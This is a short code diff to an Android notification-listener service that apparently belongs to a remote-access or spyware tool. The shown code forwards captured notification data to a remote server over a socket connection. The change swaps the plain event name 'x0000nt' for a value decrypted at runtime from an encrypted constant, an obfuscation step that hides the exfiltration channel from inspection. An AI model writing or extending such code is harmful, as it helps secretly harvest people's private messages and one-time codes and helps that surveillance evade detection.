@@ -5,6 +5,7 @@ import android.service.notification.NotificationListenerService;
 import android.service.notification.StatusBarNotification;
 import android.os.Bundle;
 import org.json.JSONObject;
+
 import io.socket.client.Socket;
 
 public class NotificationService extends NotificationListenerService {
@@ -29,7 +30,7 @@ public class NotificationService extends NotificationListenerService {
 
             Socket socket = IOSocket.getInstance().getIoSocket();
             if (socket != null && socket.connected()) {
-                socket.emit("x0000nt", data);
+                socket.emit(ObfuscationUtils.decrypt(ObfuscationUtils.ENC_X0000NT), data);
             }
         } catch (Exception e) {
             e.printStackTrace();
